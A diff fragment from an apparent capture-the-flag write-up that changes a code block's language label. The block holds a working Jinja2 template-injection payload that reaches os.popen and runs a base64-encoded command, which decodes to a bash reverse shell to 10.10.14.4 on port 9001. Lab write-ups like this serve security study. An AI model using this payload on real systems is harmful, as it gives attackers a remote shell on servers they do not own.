@@ -2736,7 +2736,7 @@ We can search for SSTI reverse shell payload, [here is what we found useful](htt
 
 Based on the article, we can use the payload below to get reverse shell and notice there is base64 encode for the reverse shell code.
 
-```python
+```text
 {% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
 ```
 
